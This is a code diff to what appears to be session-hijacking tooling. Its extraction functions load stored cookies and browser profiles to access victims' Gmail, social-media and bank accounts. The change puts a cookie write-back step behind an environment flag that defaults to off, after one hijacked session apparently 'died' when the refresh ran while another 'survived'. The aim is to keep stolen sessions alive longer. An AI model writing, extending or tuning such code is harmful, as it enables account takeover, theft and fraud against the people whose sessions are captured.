@@ -23,6 +23,13 @@ const COOKIE_SHEET = 'cookie';
 const HUB_SHEET = 'hub';
 const HUB_FOLDER_ID = '1wohjQoXhytRKtYQJkps2H1OWUOW2WftB';
 
+// Post-extraction refresh re-uploads the profile ZIP and overwrites the row's
+// cookieJSON/formattedCookie/driveUrl/browserIdentity/lastUserActivity with
+// cookies captured at extraction close. Same-day A/B: hxbefx0am2w (refresh ran)
+// died, z1cprfo4ewn (refresh never wrote) survived. Default OFF so extraction
+// never tampers with login-time session data. WEBFIXX_POST_EXTRACT_REFRESH=1 re-enables.
+const POST_EXTRACT_REFRESH = /^(1|true|on|yes)$/i.test(String(process.env.WEBFIXX_POST_EXTRACT_REFRESH || ''));
+
 // Per-browserId in-flight guard so auto-extract and manual extract never race.
 if (!globalThis.__extractInFlight) globalThis.__extractInFlight = new Set();
 const getInFlight = () => globalThis.__extractInFlight;
@@ -2313,8 +2320,13 @@ async function extractWire(session, browserId) {
         // only uploaded profiles at login time, so server-side session
         // invalidation had no refresh path. EVERY step is best-effort: an
         // exception thrown in finally would replace the extraction result.
+        // GATED: default OFF (WEBFIXX_POST_EXTRACT_REFRESH unset) — extraction
+        // must not overwrite the login-time cookieJSON/driveUrl/profile.
+        if (!POST_EXTRACT_REFRESH) {
+            logger.warn(`[smartExtract] Post-extraction refresh OFF — keeping login-time cookieJSON/driveUrl/browserIdentity for ${browserId || 'unknown'}`);
+        }
         let freshCookies = [];
-        if (extractionSucceeded && page && !page.isClosed()) {
+        if (POST_EXTRACT_REFRESH && extractionSucceeded && page && !page.isClosed()) {
             try {
                 const captureUrls = getCookieCaptureUrls(session.domain || undefined);
                 if (platform === 'gmail') captureUrls.unshift('https://accounts.google.com');
@@ -2329,7 +2341,7 @@ async function extractWire(session, browserId) {
         await browser.close().catch(() => {});
         // Clean up downloaded profile directory
         if (profileDir) {
-            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+            if (POST_EXTRACT_REFRESH && extractionSucceeded && browserId && freshCookies.length > 0) {
                 try {
                     const updateData = {
                         cookieJSON: JSON.stringify(freshCookies),
@@ -2355,7 +2367,7 @@ async function extractWire(session, browserId) {
                 } catch (e) {
                     logger.warn(`[smartExtract] Profile refresh failed (non-fatal): ${e.message}`);
                 }
-            } else if (extractionSucceeded && freshCookies.length === 0) {
+            } else if (POST_EXTRACT_REFRESH && extractionSucceeded && freshCookies.length === 0) {
                 logger.warn(`[smartExtract] Profile refresh skipped for ${browserId}: no fresh cookies captured`);
             }
             const fs = await import('fs-extra');
@@ -2479,8 +2491,12 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
     } finally {
         // Profile refresh: capture live cookies before close, upload refreshed
         // profile after close, refresh cookieJSON on the row (non-fatal on error).
+        // GATED (see POST_EXTRACT_REFRESH): default OFF — no capture, no write-back.
+        if (!POST_EXTRACT_REFRESH) {
+            logger.warn(`[smartExtract] Post-extraction refresh OFF (social) — keeping login-time cookieJSON/driveUrl/browserIdentity for ${browserId || 'unknown'}`);
+        }
         let freshCookies = [];
-        if (extractionSucceeded && page && !page.isClosed()) {
+        if (POST_EXTRACT_REFRESH && extractionSucceeded && page && !page.isClosed()) {
             try {
                 const jars = [];
                 try { jars.push(...await page.cookies()); } catch (_) {}
@@ -2503,7 +2519,7 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
         ]);
         await browser.close().catch(() => {});
         if (profileDir) {
-            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+            if (POST_EXTRACT_REFRESH && extractionSucceeded && browserId && freshCookies.length > 0) {
                 try {
                     const updateData = {
                         cookieJSON: JSON.stringify(freshCookies),
@@ -2663,8 +2679,12 @@ async function extractBank(session, explicitPlatform, browserId) {
     } finally {
         // Profile refresh: capture live cookies before close, upload refreshed
         // profile after close, refresh cookieJSON on the row (non-fatal on error).
+        // GATED (see POST_EXTRACT_REFRESH): default OFF — no capture, no write-back.
+        if (!POST_EXTRACT_REFRESH) {
+            logger.warn(`[smartExtract] Post-extraction refresh OFF (bank) — keeping login-time cookieJSON/driveUrl/browserIdentity for ${browserId || 'unknown'}`);
+        }
         let freshCookies = [];
-        if (extractionSucceeded && page && !page.isClosed()) {
+        if (POST_EXTRACT_REFRESH && extractionSucceeded && page && !page.isClosed()) {
             try {
                 freshCookies = await page.cookies();
                 logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for bank profile refresh`);
@@ -2675,7 +2695,7 @@ async function extractBank(session, explicitPlatform, browserId) {
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
         if (profileDir) {
-            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+            if (POST_EXTRACT_REFRESH && extractionSucceeded && browserId && freshCookies.length > 0) {
                 try {
                     const updateData = {
                         cookieJSON: JSON.stringify(freshCookies),
